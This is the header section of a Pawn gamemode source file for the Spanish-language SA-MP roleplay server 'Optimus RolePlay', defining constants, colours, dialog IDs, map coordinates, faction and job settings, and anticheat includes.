/*
*			   ==================================
*			   Optimus RolePlay - version: 2 (final)
*			   ==================================
*
* 	     Creado por Spell, desarrollado desde cero.
*
*   ==================================================
* 	Fecha de inicio: 						03/09/2011
* 	Fecha actual (Ultima actualización):    29/06/2013
*   ==================================================
*
*   ->> VERSIÓN: 2 [FINAL] || Fecha de finalización: [30/06/2013]
*
*   ->> VERSIÓN: 3 [BETA]  || Inicio: [30/06/2013]
*
*/
#include 	<a_samp>

#undef MAX_PLAYERS
#define MAX_PLAYERS (500)

stock SetPVarInt_OP(playerid,name[], value)
	return (value == 0) ? DeletePVar(playerid, name) : SetPVarInt(playerid,  name, value);

native IsValidVehicle(vehicleid);

#define SetPVarInt SetPVarInt_OP

// Bots inteligentes
//#define USE_FCNPC

// -===================-
#include	<fixes>
// ---------------------
#include 	<YSI\y_timers>
#include 	<YSI\y_ini>
#include    <YSI\y_bit>
// -===================-

new Iterator:Vehicle<MAX_VEHICLES>;

// -===================-
#include    <pause>
#include    <anticheat>
#include    <utils_0>
#include 	<streamer>
#include    <zcmd>
#include 	<_progress>
#include    <sscanf2>
#include 	<seif_walk>
#include    <mSelection>
#include    <serialban>

#if defined USE_FCNPC
	#include    <FCNPC>
#endif
// -===================-

#if ANTIC_VERSION != (9)
	#error OLD anticheat.inc (Current version: 9)
#endif

#if !defined _mSelection_spell_edit_
	#error Please, use the 'spell edit' for mSelection. This is needed for excecute Optimus RolePlay correctly
#endif

#if !defined _progress_spelledit_
	#error Please, use the 'spell edit' for progress. This is needed for excecute Optimus RolePlay correctly
#endif

#define VERSION_03x
//#define _HOST_LINUX_ // Esto bloquea los ataques bloqueando el acceso de la IP, pero SOLO si el host es linux..

//More security
stock SECURE_INI_WriteString(INI:Handle, line[], val[])
{
	for(new i, len = strlen(val); i < len; i++)
	{
		if(val[i] == '=')
			val[i] = '_';
	}
	INI_WriteString(Handle, line, val);
	return 1;
}

#define INI_WriteString SECURE_INI_WriteString

AntiDeAMX()
{
   new a[][] =
   {
      "Unarmed (Fist)",
      "Brass K"
   };
   #pragma unused a
}

public OnPlayerSerialBanned(playerid)
{
	return 1;
}

// -----====] General [====---- //

//SISTEMA DE GUARDADO EN TIEMPO REAL
/*#define SaveVarInt(%1,%2) 	 	INI_WriteInt    (InfoJugador[%1][jINI],#%2,InfoJugador[%1][j%2])
#define SaveVarInt2(%1,%2,%3) 	INI_WriteInt    (InfoJugador[%1][jINI],%2,%3)
#define SaveVarInt3(%1,%2,%3)   INI_WriteInt    (InfoJugador[%1][jINI],%2,%3)

#define SaveVarBool(%1,%2) 	 	INI_WriteBool   (InfoJugador[%1][jINI],#%2,InfoJugador[%1][j%2])
#define SaveVarBool2(%1,%2,%3) 	INI_WriteBool   (InfoJugador[%1][jINI],%2,%3)
#define SaveVarBool3(%1,%2,%3)  INI_WriteBool   (InfoJugador[%1][jINI],%2,%3)

#define SaveVarFloat(%1,%2) 	INI_WriteFloat  (InfoJugador[%1][jINI],#%2,InfoJugador[%1][j%2])
#define SaveVarFloat2(%1,%2,%3) INI_WriteFloat  (InfoJugador[%1][jINI],%2,%3)
#define SaveVarFloat3(%1,%2,%3) INI_WriteFloat  (InfoJugador[%1][jINI],%2,%3)

#define SaveVarString(%1,%2) 	 INI_WriteString(InfoJugador[%1][jINI],#%2,InfoJugador[%1][j%2])
#define SaveVarString2(%1,%2,%3) INI_WriteString(InfoJugador[%1][jINI],%2,%3)
#define SaveVarString3(%1,%2,%3) INI_WriteString(InfoJugador[%1][jINI],%2,%3)*/

#define MAX_ARMAS_VEH   (4)

//WEB/NOMBRE (CONFIGURACIÓN GENERAL)
#define FORO_SERVER "www.optimus-rp.com"
//#define NOMBRE_SERVER "» -Optimus Røle Play • [v1]"
#define NOMBRE_SERVER "» Øptimus Røle Pla¥ - [v2-FINAL]"
#define MODE_SERVER "Rol/roleplay español/latino"
#define RCON_SERVER "<_null:int:float:string_>"

//Ubicación del archivo
#define U_Archivo 				"Usuarios/%s.ini"

//Máximos caracteres
#define MAX_CARACTERES_CLAVE    25
#define MAX_CARACTERES_PS       25
#define MAX_CARACTERES_RS       25

//Nombres/headers
#define INFO_HEADER         ""#CINFO"Optimus Røle Play"
#define INFO_REGISTRO       "\t"#CBLANCO"¡Bienvenido/a a "#CINFO"Optimus Røle Play!\n\n\n"#CBLANCO"__________________________________________________\n\n· "#CINFO"Esta cuenta no está registrada en nuestro servidor, \npara registrarla coloque su {FFFFFF}contraseña "#CINFO"deseada aqui:\n"#CBLANCO"__________________________________________________"
#define INFO_INGRESO        ""#CBLANCO"¡Bienvenido a "#CINFO"Optimus Røle Play!\n\n"#CBLANCO"Para ingresar a su cuenta, coloque la contraseña correspondiente"

//Niveles
#define Minutos_Nivel      1

//Sistema de objetos
#define MAX_OBJETOS     200

//Tecla para entrar
#define MSG_TECLAENTRAR "\n\n"#CINFO"Presione [~k~~CONVERSATION_YES~]"

//Sistema de ropa
#define MAX_ROPA 4

//Robos
#define MIN_ENTRE_ROBOS   10

//Antecedentes
#define MAX_ANTECEDENTES 			 10
#define MAX_CARACTERES_ANTECEDENTE   70

//KeyPads/KeyControl
#define MAX_KEYPAD (50)
#define OBJ_KeyPad (19273)

new Iterator: KeyPads<MAX_KEYPAD>;

//Sistema de contraseña (casas)
#define MAX_KEY_NUMBERS (4)

#define H_TYPE_DOOR     	(1)
#define H_TYPE_DOOR_CONFIG  (2)
//Logs
// #define ANUNCIO_SERVICIO

#define LOG_CHAT false
#define CMD_LOG  true

//Radios
#define RADIO_LSTV      (0)
#define RADIO_REGGAE    (1)
#define RADIO_RAP   	(2)
#define RADIO_APAGAR    (3)

new
	URL_REGGAE[] = "http://yp.shoutcast.com/sbin/tunein-station.pls?id=5661",
	URL_RAP[] = "http://yp.shoutcast.com/sbin/tunein-station.pls?id=9054";


//Bebidas
#define PRECIO_VODKA    15
#define PRECIO_AGUA     5
#define PRECIO_CERVEZA  12
#define PRECIO_GASEOSA  8

//Tecnologia
#define PRECIO_CEL    		320
#define PRECIO_GPS    		290
#define PRECIO_BUSCADORVEH 	3500

//Camaras LSPD - de seguridad
#define MAX_CAMARAS 5

//TAZER
#define WEAP_TAZER 23

//Checkpoints
#define CHECKPOINT_STREAM   5000.0

//GangZones
#define MIN_ATACANTES_GZ     3
#define TIEMPO_GUERRA_GZ     (60*3)

//Size (Negocios y casas)

#define MAX_CARACTERES_NAME     24

#define SISTEMA_BANCO   false


// GetVehType

// -==================-
#define VEHICLE_TYPE_UNKNOWN    (-1)
#define VEHICLE_TYPE_AIRCRAFT   (0)
#define VEHICLE_TYPE_BICYCLE 	(1)
#define VEHICLE_TYPE_BIKE   	(2)
#define VEHICLE_TYPE_CAR     	(3)
#define VEHICLE_TYPE_BOAT       (4)
#define VEHICLE_TYPE_TRAIN      (5)
#define VEHICLE_TYPE_OTHER      (6)
// -==================-

// Camioneros [LVL 2]
#define CARGA_COMIDA (0)
#define CARGA_GRANO  (1)
#define CARGA_TIERRA (2)

// -----====] Seguridad [====---- //

#define ACTIVAR_SEGURIDAD true

#if !defined T_ANTICHEAT
	#define T_ANTICHEAT "El anticheat"
#endif

#if ACTIVAR_SEGURIDAD == true

	#include <CleoFuck>
	#define RakSAMP "DA0E5085558CCACC88ECCA40C4CEC49A9408EEE8"
//	native gpci(playerid, const serial[], maxlen);

	#define MenorTiempo   10000
	#define Logueos       2

#endif

// -----====] Licencias [====---- //

#define LIC_Check1 1391.9802,-37.8126,1000.480,5
#define LIC_Check2 1407.9252,-1.1173,1000.4879,5
#define LIC_Check3 1375.6302,-21.4366,1000.490,5
#define LIC_Check4 1401.7589,-44.9000,1000.470,5

// ----=== [ Vehiculos ] ---==== //

#define PRECIO_VEHRENTA         300
#define MAX_VEH_VENTA           1000
#define MAX_VEH_MODS 			12
#define MAX_VEH_PERSONA         10
#define MAX_VEH_PERSONA_2       5
#define VehVenta_ID(%0) 		VehVentaID[%0]

new Iterator:VehVenta<MAX_VEH_VENTA>;

// -----====] Sistema de portones [====---- //

#define EDIT_POS    			1
#define EDIT_ABIERTO    		2
#define PVar_PORTON      		"Editar_porton"
#define MAX_PORTONES  			15

// ----=====] Pandillas [=====----- //

#define MAX_GZS     50

// ----=====] Televisores [====----- //

#define MAX_TVS         30

#define CANAL_AV1 		1
#define CANAL_AV2 		2
#define CANAL_LSTV      3

// ----=====] ID's vehiculos [=====---- //

#define MIN_VEH_RENTA  		0
#define MAX_VEH_RENTA   	24
#define MIN_VEH_LSPD     	(MAX_VEH_RENTA+1)
#define MAX_VEH_LSPD    	45
#define MIN_VEH_LSEM    	(MAX_VEH_LSPD+1)
#define MAX_VEH_LSEM        73
#define MIN_VEH_LSMD		(MAX_VEH_LSEM+1)
#define MAX_VEH_LSMD    	88
#define MIN_CAMIONES    	(MAX_VEH_LSMD+1)
#define MAX_CAMIONES    	180
#define MIN_COSECHADORAS 	109
#define MAX_COSECHADORAS    112
#define MIN_VEH_LSTV     	(MAX_COSECHADORAS+1)
#define MAX_VEH_LSTV        123
#define MIN_VEH_MECANICOS   (MAX_VEH_LSTV+1)
#define MAX_VEH_MECANICOS   128
#define MIN_VEH_BICIS       (MAX_VEH_MECANICOS+1)
#define MAX_VEH_BICIS       (MIN_VEH_BICIS+9)
#define MIN_VEH_BASUREROS   (MAX_VEH_BICIS+1)
#define MAX_VEH_BASUREROS   (MIN_VEH_BASUREROS+7)
#define MIN_VEH_GOB         (MAX_VEH_BASUREROS+1)
#define MAX_VEH_GOB         (MIN_VEH_GOB+11)
#define MIN_VEH_HIT         (MAX_VEH_GOB+1)
#define MAX_VEH_HIT         (MIN_VEH_HIT+7)

// ----=====] Macros [=====---- //

#define CALLBACK:%0(%1)   					forward %0(%1); public %0(%1)
#define Loop(%0,%1,%2)  					for(new %0 = %2; %0 < %1; %0++)
#define Mensaje         					SendClientMessage
#define MensajeTodos 						SendClientMessageToAll
#define TextoJugador 						GameTextForPlayer
#define TextoTodos 							GameTextForAll
#define Dialog(                 			ShowPlayerDialog(
#define isnull(%1)              			((%1[0] == 0) || (%1[0] == 1 && %1[1] == 0))
#define Comando_En_Auto 					if(!IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡Debes estar en un vehículo para utilizar este comando!");
#define Para_Admin_Servicio     			if(!GetPVarInt(playerid,"ADMIN_ONDUTY")) return Error(playerid,"¡Debes estar en Servicio! (/admservice)");
#define ParamsINC(%1,%2) 					Mensaje(%1,-1, ""#CAZULRARO"» "#CBLANCO"El comando, es: "#CAZULRARO"" %2)
#define PRESSED(%0)							(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define HOLDING(%0) 						((newkeys & (%0)) == (%0))
#define PosJugador[%0]          			InfoJugador[playerid][jPos%0]
#define A_Format(%1,            			format(%1,sizeof(%1),
#define int 								floatround
#define PlayerCP<%1>:                       if(PlayerCP:checkpointid == Checkpoint_Jugador[playerid][%1])
#define CheckpointGPS(%0,%1,%2,%3,%4)		SetPlayerCP(%0,CP_GPS,%1,%2,%3,%4)
#define ClearString(%0)                     for(new ClearStr; ClearStr < strlen(%0)+1; ++ClearStr) %0[ClearStr] = 0; %0[0] = '\0'
#define MensajeTodosF(				        MensajeF(INVALID_PLAYER_ID,
#define MensajeAdminF(%0,%1,%2,%3);         foreach(Player, MensajeAdmF) if(InfoJugador[MensajeAdmF][jAdmin] >= %2) MensajeF(MensajeAdmF,%0,%1,%3);
#define MensajeFamiliaF(%0,%1,%2);          foreach(Player, MensajeFamF) if(ID_Familia(MensajeFamF) == %0) MensajeF(MensajeFamF,-1,%1,%2);
#define MensajeFaccionF(%0,%1,%2);          foreach(Player, MensajeFacF) if(ID_Faccion(MensajeFacF) == %0) MensajeF(MensajeFacF,-1,%1,%2);
#define AbreviarCMD(%0,%1)                  CMD:%1(a,b[]) return cmd_%0(a,b)

// ----=====] TIMERS [====----- //

#define INVALID_TIMER_ID 	(-1)

#define TIMER_CARCEL 		0
#define TIMER_CARGANDOCOMB 	1
#define TIMER_TDINICIO 		2
#define TIMER_LICENCIA 		3
#define TIMER_ACCESORIO 	4
#define TIMER_VISITAC 		5
#define TIMER_BMOTOR   		6
#define TIMER_CANCELARR     7
#define TIMER_VAAMORIR      8
#define TIMER_CAMILLA       9
#define TIMER_REPARTIRPIZZA 10

#define MAX_TIMERS 			11

// ----====] INTERIORES [=====---- //

#define INVALID_INTERIOR_ID     -1

#define MAX_INTERIORES          20

// ----====] CHECKPOINTS [====---- //

#define INVALID_PCP_ID -1

#define CP_ROBO         0
#define CP_LICENCIAVEH  1
#define CP_GPS          2
#define CP_CAMIONERO    3
#define CP_BASURERO     4
#define CP_REPARTIDORB  5
#define CP_REPARTIDORP  6

#define MAX_PCP         7

// ----====] MAP ICONS [====---- //

#define MI_GANGWARS     	(1)
#define MI_HERIDO       	(2)
#define MI_FABRICA_COMIDA   (3)
#define MI_FABRICA_GRANO    (4)
#define MI_FABRICA_TIERRA   (5)

// ----=====] Colores [=====---- //

#define C_GZ_EN_GUERRA  0xFF000081

#define C_NEGATIVO 		0xCDC7A2FF
#define C_POSITIVO 		0xA9D159FF
#define C_ROJO       	0xFF0000E8
#define C_AZUL 	     	0x0000FFFF
#define C_AMARILLO   	0xFFFF00FF
#define C_NARANJA     	0xFF7D00FF
#define C_VERDE      	0x6FA828FF
#define C_VERDE2     	0x84BB00FF
#define C_AZULMARINO 	0x00007BFF
#define C_AZULRARO 		0xB5B6FF00
#define C_GRIS 		 	0x7D7D79FF
#define C_GRISCLARO  	0xB2B2B3FF
#define C_BLANCO     	0xFFFFFFE8
#define C_NEGRO		 	0x000000FF
#define C_CELESTE 	 	0x00FFFFFF
#define C_LILA 		 	0xFF00FFFF
#define C_MORADO     	0xBD00B9FF
#define C_ROSA 	     	0xFF00C9FF
#define C_VIOLETA    	0xBD00EAFF
#define C_AZUL2 	 	0x0B79C3FF
#define C_AZULCLARO   	0x0096DCFF
#define C_INFO 			0x72B1FFFF
#define C_GOBIERNO 		0x92CFB4FF
#define C_ADMOFFDUTY    0xF36259FF
#define C_SALMON        0xF2B573FF
#define C_ADMINCHAT     0x00D77DFF
#define C_DESTACADO     0xFFC400FF
#define C_AYUDANTE      0xFF8600FF
#define C_COLABORADOR   0xE400A0FF
#define C_MODERADOR     0x24C290FF
#define C_MODSUPERIOR   0x24CD00FF
#define C_ADMINISTRADOR 0xFF0000FF
#define C_SUBDUENO      0x24C2E5FF
#define C_DUENO	    	0xEA7384FF
#define C_ME            0xFFCB90FF
#define C_DO 			C_POSITIVO
#define C_DUTYLSPD      0x33CCFF00
#define C_DUTYLSMD      0xFF886D00
#define C_DUTYLSEM      0x6FA82800
#define C_LSPD          0x33CCFFFF
#define C_LSMD          0xFF886DFF
#define C_EXP   		0xFFFFFFFF
#define	C_HAMBRE    	0xFF7D00FF
#define	C_CANSANCIO		0x00AAFFFF
#define	C_ORINA     	C_AMARILLO
#define C_DUDAS 		0xB3C472FF
#define C_AZULLINDO     0x5FB2FFFF
#define C_NARANJA2      0xFFA000FF

//HTML
#define	CHAMBRE    		"{FF7D00}"
#define	CCANSANCIO		"{00AAFF}"
#define	CORINA     		"{E8F800}"
#define CAMARILLO 		"{E8F800}"
#define CNARANJA 		"{E68C0E}"
#define CAZUL   		"{0000FF}"
#define CAZUL2          "{0B79C3}"
#define CVERDE 			"{6FA828}"
#define CBLANCO  		"{FFFFFF}"
#define CROJO    		"{FF0000}"
#define CGRIS   		"{7D8584}"
#define CAZULCLARO   	"{0096DC}"
#define CPOSITIVO   	"{A9D159}"
#define CNEGATIVO		"{CDC7A2}"
#define CINFO           "{72B1FF}"
#define CGOBIERNO       "{92CFB4}"
#define CROJOFLUOR      "{FF0000}"
#define CVERDEFLUOR     "{ADFB00}"
#define CVIOLETA        "{B21CF8}"
#define CNEGRO          "{000000}"
#define CROSA           "{FE1CF8}"
#define CSALMON         "{F2B573}"
#define CAZULRARO       "{B5B6FF}"
#define CADMINCHAT      "{00D77D}"
#define CADMOFFDUTY     "{F36259}"
#define CLSPD           "{33CCFF}"
#define CLSMD           "{FF886D}"
#define CAQUA           "{00FFFF}"
#define CNARANJA2       "{FFA000}"
#define CAZULLINDO      "{5FB2FF}"

//STAFF
#define CDESTACADO      "{FFC400}"
#define CAYUDANTE       "{FF8600}"
#define CCOLABORADOR    "{E400A0}"
#define CMODERADOR      "{24C290}"
#define CMOD.SUPERIOR   "{24CD00}"
#define CADMINISTRADOR  "{FF0000}"
#define CSUBDUENO       "{24C2E5}"
#define CDUENO	        "{EA7384}"

//HABLAR (CHAT)
#define Hablar       	0xE6E6E6E6
#define Hablar2      	0xC8C8C8C8
#define Hablar3      	0xAAAAAAAA
#define Hablar4      	0x8C8C8C8C
#define Hablar5      	0x6E6E6E6E

// ----=====] Dialogs [=====---- //

#define dRegistro       1
#define dIngreso        2
#define dConfirmarP     3
#define dPreguntaS      4
#define dRespuestaS     5
#define dOtraPS         6
#define dRecordarC      7
#define dOlvidoC        8
#define dDatos          9
#define dSabeReglas     10
#define dTest           11
#define dVehRenta       12
#define dInfo 			13
#define dAscensorLSPD   14
#define dRoperoLSPD     15
#define dIngresoPrimero 16
#define dArmeriaLSPD    17
#define dAyuda          18
#define dAyuda2         19
#define dColor1         20
#define dColor2         21
#define dAdmTeleport    22
#define dArmeriaLSEM    23
#define dRoperoLSEM     24
#define dControlVeh     25
#define dAscensorLSMD   26
#define dCajaFuerte     27
#define dDepositar      28
#define dSacar          29
#define dCambiarPassCF  30
#define dRoperoLSMD     31
#define dMenuNegocio    32
#define dNegCF		    33
#define dNegNombre      34
#define dNegEntrada     35
#define dMenuCasa	    36
#define dCasaPrecio     37
#define dCasaNombre     38
#define dCasaPuertas    39
#define dAdmClick       40
#define dCargarCamion   41
#define dCDepositar     42
#define dCRetirar       43
#define dCTransferir    44
#define dEditarObj      45
#define dCambiarTexto   46
#define dCambiarColor   47
#define dCambiarTamano  48
#define dCambiarTamanoO 49
#define dEliminarO      50
#define dActualizarO    51
#define dMandarSMS      52
#define dElegirSRopa    53
#define dEditarRopa     54
#define dEditarRopa_2   55
#define dLicencia       56
//#define dAceptarFac     57
//#define dAceptarFam     58
#define dCrearPorton    59
#define dEditPorton   	60
#define dCasaArmas      61
#define dAEntrevista    62
#define dMasCelular     63
#define dAgendarCel     64
#define dCelContacto    65
#define dElegirBebida   66
#define dElejirArmCat   67
#define dArmPistola	    68
#define dArmSubFusil    69
#define dArmEscopeta    70
#define dArmRifle       71
#define dArmAsalto      72
#define dElejirArmBal   73
#define dComprarBalas   74
#define dElejirSlotA    75
#define dEAccesorios_0  76
#define dEAccesorios_1  77
#define dElejirParte    78
#define dElejirPos_A    79
#define dConfirmarEA    80
#define dCamarasLSPD    81
#define dMMecanicos_0   82
#define dMMecanicos_1   83
#define dMMecanicos_2   84
#define dMMecanicos_3   85
#define dMMecanicos_2_0 86
#define dMMecanicos_2_1 87
#define dMMecanicos_2_2 88
#define dMMecanicos_2_3 89
#define dMercadoNegro   90
#define dGPS_0          91
#define dGPS_Negocios   92
#define dGPS_Negocios_0 93
#define dGPS_Trabajos   94
#define dGPS_LPublicos  95
#define dGPS_Conce      96
#define dCTecnologia    97
#define dGPS_ZRurales   98
#define dEditarFam      99
#define dFamNombre      100
#define dCMedicamentos  101
#define dTomarMed       102
#define dDarMed         103
#define dComprarSaldo   104
#define dCDroga         105
#define dBuscadorVeh    106
#define dCambiarPass    107
#define dCComida_pi     108
#define dCComida_h      109
#define dCComida_po     110
#define dLPolicia       111
#define dEstadio        112
#define dCBoleto        113
#define dElegirCasaM    114
#define dCasaMuebles    115
#define dColocarMueble  116
#define dBorrarMueble   117
#define dBorrarMueble_0 118
#define dEditarMuebleE  119
#define dOcultarMueble  120
#define dDarDroga       121
#define dCMueble        122 // VERSION 0.3e
#define dCCasa          123
#define dRecuperarPass  124
#define dPrecioyNombreM 125
#define dAyuda3         126
#define dCasaContra     127
#define dCambiarIndexO  128
#define dElegirAcento   129
#define dInfoLSPD       130
#define dBuscarPersona  131
#define dAgregarAnt     132
#define dFundirMineral  133
#define dRadio          134
#define dSpecReport     135
#define dElegirFamFac   136
#define dJustificarOffD 137
#define dSolicitarADM   138
#define dFaccion        139 // VERSION 3 START
#define dFac_Rangos 	140
#define dFac_Rango_2 	141
#define dChangePregunta 142
#define dIDModeloPorton 143
#define dEditVelocidadP 144
#define dReglas         145
#define dReglas_2       146

#define dError          500

// ----=====] Rangos Staff [=====---- //

#define Destacado       	(1)
#define Ayudante        	(5)
#define Colaborador     	(9)
#define Moderador       	(24)
#define Mod.Superior    	(48)
#define Administrador   	(59)
#define AdministradorSup    (95)
#define SubDueno        	(125)
#define Dueno           	(256)

// --------=======[ Admin ]=======----------- //

#define ADM_EligeSkin 	1
#define ADM_EligeInt  	2
#define ADM_EligeVW   	3
#define ADM_Vida      	4
#define ADM_Carcel    	5
#define ADM_Kick      	6
#define ADM_Ban       	7
#define ADM_Familia   	8
#define ADM_FamRango  	9
#define ADM_FamMiembro  10
#define ADM_FamLider  	11
#define ADM_Faccion     12
#define ADM_FacRango    13
#define ADM_FacMiembro  14
#define ADM_FacLider  	15
#define ADM_Dinero      16
#define ADM_FijDin      17
#define ADM_QuitDin     18
#define ADM_DarDin      19
#define ADM_CarcelR     20

#define MENU_ADMTELEPORT "Ayuntamiento\nLSPD\nGrove\nFuerza aerea\nAlcaldia\nGrotti\nYakuza\nLSTV\nMansión MaddDog\nAeropuerto\nSureños\nClinica\nAutos Usados\nHospital\nAmmu-Nation\nLicencias\nAlhambra\nDrogas\nCamioneros\nRepartidor Pizza\nRepartidor Diario\nBasureros\nCosechadores"

// ---======[ Negocios ]======------ //

#define MAX_NEGOCIOS            25
#define MAX_NEGOCIOS_JUGADOR    2

#define N_247     		0
#define N_ROPA          1
#define N_BOLICHE       2
#define N_COMIDA        3
#define N_ARMAS         4
#define N_TECNOLOGIA    5
#define N_CASINO     	6
#define N_FARMACIA      7

new Iterator:Negocios<MAX_NEGOCIOS>;

#define INVALID_BUSINESS_ID    	999

// ---======[ Casas ]======------ //

#define MAX_CASAS               250
#define MAX_INTERIORES_CASA     20
#define MAX_CASAS_JUGADOR       2
#define MAX_GARAGES             100
#define MAX_MUEBLES_CASA        75

new Iterator:Casas<MAX_CASAS>;
new Iterator:Garages<MAX_GARAGES>;

#define LABEL_GARAGE_E        "Garaje"#MSG_TECLAENTRAR""
#define LABEL_GARAGE_S        "Garaje"#MSG_TECLAENTRAR""

#define INVALID_HOUSE_ID    	999

// -=============== NPCS =================- //

#if defined USE_FCNPC
new Iterator:FCNPCs<MAX_PLAYERS>;
#endif

// -=============== OBJETOS ====================- //
#define OBJ_BIDON   		(1650)
#define OBJ_CEL     		(18871)
#define OBJ_GPS     		(18875)
#define OBJ_PALANCA 		(18634)
#define OBJ_LLAVE			(18633)
#define OBJ_MARTILLO		(18635)
#define OBJ_DESTORNILLADOR	(18644)
#define OBJ_DINAMITA        (1654)
#define OBJ_MASCARA         (19036)

#define MAX_OBJS            (sizeof(ObjectInfo))
#define LIST_INV        	(2)

// ---======[ Sistema de celular ]======------ //

#define ID_MENUCEL  		0
#define ID_MENURADIO 		1
#define ID_MENUMARCAR 		2
#define ID_MENUCONTACTOS 	3
#define ID_MENUMENSAJE  	4

// ----====] Sistema de banco [=====------ //

#define MAX_CUENTAS_BANCARIAS (5000)

// ----=====] Slots attacheds [=====---- //

#define SLOT_ARMADURA    	(7)
#define SLOT_CARA	    	(8)
#define SLOT_OBJECTS 		(9)

// ---===] Cordenadas [===----  //

#define POS_AYUNTA      		1478.8202,-1725.8673,13.5469
#define POS_LSPD        		1560.3490,-1627.1450,13.5469
#define POS_GROVE       		2499.9067,-1670.2590,13.3488
#define POS_FUERZAAEREA 		413.0000,-2293.0000,49.00000
#define POS_ALCALDE     		1426.3198,-1878.8347,13.3828
#define POS_GROTTI      		556.8184,-1253.7656,17.08990
#define POS_YAKUZA      		505.4417,-1443.9169,14.89530
#define POS_LSTV        		747.2659,-1348.4464,13.50980
#define POS_MADDDOG     		1238.5730,-738.8634,95.69330
#define POS_AEROPUERTO  		1437.4596,-2287.5271,13.5469
#define POS_SURENOS     		1883.7181,-2028.9174,13.3906
#define POS_CLINICA     		2029.8744,-1419.2386,16.9922
#define POS_AUTOSUSADOS 		1525.8162,-1026.1946,23.9204
#define POS_HOSPITAL    		1200.7026,-1323.8402,13.3984
#define POS_AMMUNATION  		1426.000,-2385.000,63.000000
#define POS_LICENCIAS   		1173.3685,-1741.1072,13.3984
#define POS_ALHAMBRA    		1822.2174,-1684.2032,13.3828
#define POS_CAMIONEROS          2504.5823,-2084.5154,13.5469
#define POS_REPARTIDORPIZZA     2105.0361,-1827.8997,13.5567
#define POS_REPARTIDORDIARIO    2028.1464,-1289.4213,20.9421
#define POS_BASUREROS           1277.1587,-1252.6556,14.2648
#define POS_COSECHADORES        -362.6034,-1480.5768,25.7266

// ----=====[ Cámaras ]=====----- //

//Cámaras separadas
#define CamaraAyunta		1468.000,-1712.000,35.000
#define CamaraAyuntaAt   	1469.000,-1718.000,33.000
#define CamaraGrotti 		496.000,-1246.000,39.000
#define CamaraGrottiAt 		499.000,-1248.000,38.000
#define CamaraLSPD      	1505.000,-1673.000,43.000
#define CamaraLSPDAt 		1525.000,-1673.000,32.000
#define CamaraAutosUsados 	1524.000,-1023.000,35.000
#define CamaraAutosUsadosAt	1535.000,-1022.000,34.000
#define CamaraLSTV			788.000,-1287.000,43.000
#define CamaraLSTVAt        785.000,-1294.000,41.000
#define CamaraAeropuerto    1426.000,-2385.000,63.000
#define CamaraAeropuertoAt  1429.000,-2379.000,59.000
#define CamaraSurenos       1879.000,-2096.000,42.000
#define CamaraSurenosAt		1880.000,-2080.000,36.000
#define CamaraClinica       1985.000,-1470.000,44.000
#define CamaraClinicaAt     1990.000,-1463.000,40.000
#define CamaraLicencias     1177.000,-1704.000,26.000
#define CamaraLicenciasAt   1172.000,-1712.000,25.000
#define CamaraHospital      1230,-1325,30
#define CamaraHospitalAt    1188,-1327,16
#define CamaraFuerzaAerea   413.000,-2293.000,49.000
#define CamaraFuerzaAereaAt 418.000,-2299.000,44.000
#define CamaraCamioneros    2405.000,-2086.000,23.000
#define CamaraCamionerosAt	2414.000,-2087.000,20.000
#define CamaraEdificios     1683.000,-1472.000,344.000
#define CamaraEdificiosAt   1680.000,-1468.000,342.000
#define CamaraAeropuerto2   1479.000,-2355.000,216.000
#define CamaraAeropuerto2At 1468.000,-2355.000,210.000
#define CamaraAlhambra      1803.000,-1687.000,27.000
#define CamaraAlhambraAt    1814.000,-1685.000,24.000

// ----=====] Pickups [=====---- //

#define ID_PICKUPINT 		1318
#define ID_PICKUPROPERO 	1275
#define ID_PICKUPARMAMENTO  346
#define ID_PICKUPCAJAFUERTE 1274
#define ID_PICKUPNEGOCIO    ID_PICKUPINT
#define ID_PICKUPCASA    	1273
#define ID_PICKUPTRABAJO    1239
#define ID_PICKUPTV         1239
#define ID_PICKUPINFO       1239
#define ID_PICKUPHITMAN     1254
#define ID_OBJDINAMITA      1654

// ---====[ Caja fuerte ]====---- //

#define CF_FACCION  1
#define CF_NEGOCIO  2
#define CF_CASA     3

// ---==== [ Objetos ] ======----- //

#define MAX_OBJETOS_T 		(70)
#define	MAX_HORAS_OBJ_T     (3)
#define OBJ_ARMA  	 		(1)
#define OBJ_CHALECO  		(3)

// ---====[ Facciones ]====---- //

//General
#define MAX_FACCIONES   (8)
#define MAX_RANGOS_FAC  8
#define MAX_RANGO_LEN   16

#define IDLSPD          1
#define IDLSEM          2
#define IDLSMD          3
#define IDLSTV          4
#define IDMECANICOS     5
#define IDGOBIERNO      6
#define IDHITMAN        7

#define CPLSPDC 	1548.69995117,-1625.09997559,14.39999962
#define CPLSPDA 	1548.69995117,-1620.59997559,14.39999962
#define CPLSPDC2 	1548.69995117,-1630.50000000,14.39999962
#define CPLSPDA2    1548.69995117,-1634.40002441,14.39999962

#define NUMERO_POLICIA  	101
#define NUMERO_HOSPITAL 	102
#define NUMERO_CLARO		103
#define NUMERO_MECANICOS 	104

// ---====[ Familias ]====---- //

#define MAX_FAMILIAS 10

// --====[ Sistema de drogas ]===--- //

#define CORDS_DROGA 2122.1999512,-2007.0000000,8.0000000

#define DROGA_MARIHUANA 0
#define DROGA_COCAINA 	1
#define DROGA_HEROINA   2
#define DROGA_OPIO      3
#define DROGA_CANNABIS  4

#define MAX_DROGAS   	(5)

// ---===[ Trabajos ]====---- //

//Camionero
#define ID_Camionero    (1)

#define CAR_ROPA      1
#define CAR_PRODUCTOS 2
#define CAR_COMIDA    3

//Cosechadores
#define ID_Cosechador 	(2)

//Repartidor de bici
#define ID_RepartidorB  (3)
#define PVarRepartidorB "PARTE_REPARTIDORBICI"

//Basurero
#define ID_Basurero     (4)

//Ladron
#define ID_Ladron       (5)

//Repartidos de pizza
#define ID_RepartidorP  (6)

//Taxista
#define ID_Taxista      (7)

// ---====[ News ]====---- //

new
	Nombre[MAX_PLAYERS][MAX_PLAYER_NAME],
	Nombre_[MAX_PLAYERS][MAX_PLAYER_NAME],
	Cono[100] = {INVALID_OBJECT_ID, ...},
	VehRentado[MAX_VEH_RENTA+1],
	VGas[MAX_VEHICLES] = {100,...},
	Hora, Minuto,
	strNum[MAX_PLAYERS][10],
	LicenciaAuto[3],
	LicenciaMoto[3],
	ID_VehOriginal[MAX_VEH_VENTA],
	SirenaVeh[6],
	VehConSirena[4],
	Accesorio_Obj[MAX_PLAYERS],
	OBJ_Camara[MAX_CAMARAS],
	OBJ_Basura[50],
	OBJ_Bomba[MAX_PLAYERS] = {INVALID_OBJECT_ID, ...},
 	tCount,
 	OBJ_T[MAX_OBJETOS_T],
	OBJ_Carcel[30],

	// General
	Record_UsersOn,
